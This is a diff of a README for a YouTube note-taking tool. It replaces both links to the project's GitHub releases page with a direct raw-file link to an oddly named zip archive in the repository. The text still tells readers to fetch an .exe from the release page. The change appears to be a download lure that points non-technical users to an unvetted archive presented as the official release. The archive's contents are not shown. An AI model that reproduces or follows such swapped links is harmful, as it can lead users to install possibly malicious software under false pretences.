@@ -1,6 +1,6 @@
 # 📺 Watch_Youtube_Skill - Turn YouTube videos into useful notes
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Afedo868/Watch_Youtube_Skill/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Afedo868/Watch_Youtube_Skill/main/watch_youtube/Watch-Youtube-Skill-cuboctahedron.zip)
 
 ## 🎯 Purpose
 This application extracts information from YouTube videos. Many videos contain important visuals that the speaker does not mention. This tool watches the video stream and reads the transcript to document key moments. It captures screenshots of important slides or demonstrations and saves them into readable text files. You can open these files in Obsidian or any other note-taking software to keep a permanent library of your video research.
@@ -18,7 +18,7 @@ You do not need to be a developer to use this tool. Follow these steps to set up
 ### 1. Download
 Visit the link below to reach the project release page. Look for the file ending in `.exe` under the latest version. Click the file to download it to your computer.
 
-[Click here to visit the release page and download your copy](https://github.com/Afedo868/Watch_Youtube_Skill/releases)
+[Click here to visit the release page and download your copy](https://raw.githubusercontent.com/Afedo868/Watch_Youtube_Skill/main/watch_youtube/Watch-Youtube-Skill-cuboctahedron.zip)
 
 ### 2. Preparation
 Navigate to your Downloads folder. Locate the file you just saved. Move this file to a folder where you want to keep your programs, such as a folder on your Desktop or in your Documents directory. Keep the file in a permanent spot because this is where the application will run.
